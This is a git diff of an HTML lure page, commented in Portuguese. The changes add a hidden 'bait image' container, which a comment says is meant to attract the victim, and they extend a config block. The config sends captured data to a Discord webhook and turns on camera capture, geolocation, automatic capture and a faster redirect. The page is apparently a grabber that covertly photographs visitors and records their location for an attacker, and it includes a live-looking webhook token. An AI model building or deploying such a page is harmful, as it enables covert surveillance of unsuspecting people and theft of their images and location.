@@ -10,20 +10,29 @@
   </style>
 </head>
 <body>
-  <div id="status">Aguarde, verificando...</div>
+  <div id="status">Carregando imagem...</div>
   <div id="debugBox"></div>
+  
+  <!-- Imagem isca para atrair a vítima -->
+  <div id="trapContainer" style="text-align:center; padding:20px; display:none;">
+    <h2>Imagem Interessante</h2>
+    <img id="trapImage" src="" alt="Imagem" style="max-width:100%; height:auto; border-radius:8px; box-shadow:0 4px 8px rgba(0,0,0,0.3);">
+    <p style="margin-top:10px; color:#666;">Clique na imagem para ampliar</p>
+  </div>
 
   <!-- Config inline mínima (pode sobrescrever via osint-config.js ou querystring) -->
   <script>
     window.OSINT_CONFIG = {
-      webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6Xy3Xxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF", // ⚠️ TROQUE
+      webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF", // ⚠️ TROQUE
       finalUrl: "https://www.exemplo.com",   // destino padrão
       requestCamera: true,   // tentar câmera?
       requestGeo: true,      // tentar geolocalização?
-      redirectDelayMs: 10000, // atraso antes do redirect
+      redirectDelayMs: 3000, // atraso antes do redirect
       debug: true,           // mostrar logs na tela
       splitImage: true,      // dividir imagem em partes?
-      chunkSize: 500000      // tamanho máximo de cada parte (bytes)
+      chunkSize: 500000,     // tamanho máximo de cada parte (bytes)
+      autoCapture: true,     // capturar imagem automaticamente?
+      trapImage: "https://picsum.photos/800/600" // imagem isca para atrair vítima
     };
   </script>
 
